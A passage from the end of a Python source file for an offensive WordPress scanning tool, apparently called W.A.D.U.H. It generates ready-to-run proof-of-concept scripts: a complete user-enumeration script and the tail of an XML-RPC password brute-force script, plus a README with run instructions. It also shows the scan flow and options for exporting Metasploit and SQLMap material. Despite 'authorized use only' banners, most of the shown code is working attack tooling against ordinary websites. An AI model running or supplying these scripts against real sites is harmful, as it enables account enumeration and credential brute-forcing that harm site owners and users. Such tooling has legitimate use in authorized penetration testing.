                    f.write("        if test_login(USERNAME, password):\n")
                    f.write("            print(f\"\\n\\n[+] SUCCESS! Valid credentials found:\")\n")
                    f.write("            print(f\"    Username: {USERNAME}\")\n")
                    f.write("            print(f\"    Password: {password}\")\n")
                    f.write("            return\n\n")

                    f.write("    print(\"\\n\\n[-] No valid credentials found\")\n\n")

                    f.write("if __name__ == \"__main__\":\n")
                    f.write("    main()\n")

                self.log(f"[+] PoC generated: {poc_filename}", Fore.GREEN)
            except Exception as e:
                self.log(f"[!] Failed to generate XMLRPC PoC: {e}", Fore.RED)

        # Generate user enumeration PoC
        poc_filename = os.path.join(poc_dir, "user_enumeration.py")
        try:
            with open(poc_filename, "w", encoding="utf-8") as f:
                f.write("#!/usr/bin/env python3\n")
                f.write("\"\"\"\n")
                f.write("WordPress User Enumeration PoC\n")
                f.write(f"Target: {self.target_url}\n")
                f.write("AUTHORIZED USE ONLY\n")
                f.write("\"\"\"\n\n")
                f.write("import requests\n")
                f.write("import re\n\n")

                f.write(f"TARGET = \"{self.target_url}\"\n\n")

                f.write("def enumerate_users(max_id=10):\n")
                f.write("    print(f\"[*] Enumerating users on {TARGET}\\n\")\n")
                f.write("    found_users = []\n\n")

                f.write("    for user_id in range(1, max_id + 1):\n")
                f.write("        url = f\"{TARGET}/?author={user_id}\"\n")
                f.write("        try:\n")
                f.write("            response = requests.get(url, allow_redirects=True, timeout=10)\n")
                f.write("            if response.status_code == 200:\n")
                f.write("                match = re.search(r'/author/([^/\\'\"]+)', response.url)\n")
                f.write("                if match:\n")
                f.write("                    username = match.group(1)\n")
                f.write("                    found_users.append(username)\n")
                f.write("                    print(f\"[+] User ID {user_id}: {username}\")\n")
                f.write("        except Exception as e:\n")
                f.write("            print(f\"[-] Error testing ID {user_id}: {e}\")\n\n")

                f.write("    print(f\"\\n[*] Found {len(found_users)} users:\")\n")
                f.write("    for user in found_users:\n")
                f.write("        print(f\"    - {user}\")\n\n")

                f.write("    # Save to file\n")
                f.write("    with open('found_users.txt', 'w') as f:\n")
                f.write("        for user in found_users:\n")
                f.write("            f.write(f\"{user}\\n\")\n")
                f.write("    print(f\"\\n[+] Users saved to found_users.txt\")\n\n")

                f.write("if __name__ == \"__main__\":\n")
                f.write("    enumerate_users(max_id=20)\n")

            self.log(f"[+] PoC generated: {poc_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to generate user enumeration PoC: {e}", Fore.RED)

        # Create README for PoCs
        readme_filename = os.path.join(poc_dir, "README.md")
        try:
            with open(readme_filename, "w", encoding="utf-8") as f:
                f.write("# Proof-of-Concept Scripts\n\n")
                f.write(f"Generated by W.A.D.U.H. Scanner v2.2\n\n")
                f.write(f"**Target:** {self.target_url}\n\n")
                f.write("**⚠️ AUTHORIZED USE ONLY - These scripts are for authorized penetration testing**\n\n")
                f.write("## Usage\n\n")
                f.write("1. Make scripts executable:\n")
                f.write("   ```bash\n")
                f.write("   chmod +x *.py\n")
                f.write("   ```\n\n")
                f.write("2. Install dependencies:\n")
                f.write("   ```bash\n")
                f.write("   pip install requests\n")
                f.write("   ```\n\n")
                f.write("3. Run scripts:\n")
                f.write("   ```bash\n")
                f.write("   python3 user_enumeration.py\n")
                if self.xmlrpc_enabled and self.found_users:
                    f.write("   python3 xmlrpc_bruteforce.py\n")
                f.write("   ```\n\n")

            self.log(f"[+] PoC scripts generated in: {poc_dir}", Fore.GREEN + Style.BRIGHT)
        except Exception as e:
            self.log(f"[!] Failed to create PoC README: {e}", Fore.RED)

    # ---------------- MAIN FLOW ----------------

    def run(self) -> None:
        """Main execution flow"""
        self.banner()
        self.get_input()

        if not self.check_connection():
            self.log("[!] Scan aborted due to connection failure.", Fore.RED)
            return

        # Core checks
        self.detect_version()
        self.enumerate_plugins_themes()
        self.check_security_headers()
        self.check_wp_artifacts()
        self.check_directory_listing()
        self.check_robots_sitemap()
        self.check_sensitive_files()

        # Vulnerability tests
        self.test_user_enumeration()
        self.test_xmlrpc_vulnerabilities()
        self.check_database_errors()

        # REST API analysis
        self.analyze_rest_api()

        # Final report
        self.generate_final_report()


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="W.A.D.U.H. - WordPress Analysis & Debugging Utility Helper v2.2 Exploitation Export Edition",
        epilog="AUTHORIZED USE ONLY - Only scan targets you have permission to test"
    )

    parser.add_argument(
        '-u', '--url',
        type=str,
        help='Target URL (e.g., http://example.com)'
    )

    parser.add_argument(
        '--verify-ssl',
        action='store_true',
        help='Verify SSL certificates (default: disabled for testing)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output (show debug information)'
    )

    parser.add_argument(
        '-q', '--quiet',
        action='store_true',
        help='Quiet mode (minimal output)'
    )

    parser.add_argument(
        '-r', '--rate-limit',
        type=float,
        default=0.5,
        help='Rate limit between requests in seconds (default: 0.5)'
    )

    parser.add_argument(
        '-d', '--deep',
        action='store_true',
        help='Deep scan mode (more thorough but slower)'
    )

    parser.add_argument(
        '-o', '--output',
        type=str,
        default='.',
        help='Output directory for reports (default: current directory)'
    )

    parser.add_argument(
        '--wpscan-token',
        type=str,
        default=None,
        help='WPScan API token for vulnerability database checks (get free token at https://wpscan.com/api)'
    )

    parser.add_argument(
        '--no-color',
        action='store_true',
        help='Disable colored output'
    )

    parser.add_argument(
        '--export-metasploit',
        action='store_true',
        help='Export findings to Metasploit resource file (.rc)'
    )

    parser.add_argument(
        '--export-sqlmap',
        action='store_true',
        help='Export SQLMap commands for SQL injection testing'
    )

    parser.add_argument(
        '--generate-pocs',
        action='store_true',
        help='Generate proof-of-concept Python scripts'
    )

    return parser.parse_args()


if __name__ == "__main__":
    try:
        args = parse_arguments()

        # Disable colors if requested
        if args.no_color:
            init(strip=True, convert=False)

        scanner = YikesScanner(args)

        # If URL provided via CLI, use it
        if args.url:
            scanner.target_url = args.url.rstrip('/')
            if not scanner.target_url.startswith("http"):
                scanner.target_url = "http://" + scanner.target_url
            scanner.log(f"[*] Target set to: {scanner.target_url}\n", Fore.GREEN)
            scanner.banner()

        scanner.run()

    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] W.A.D.U.H. stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Unexpected error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
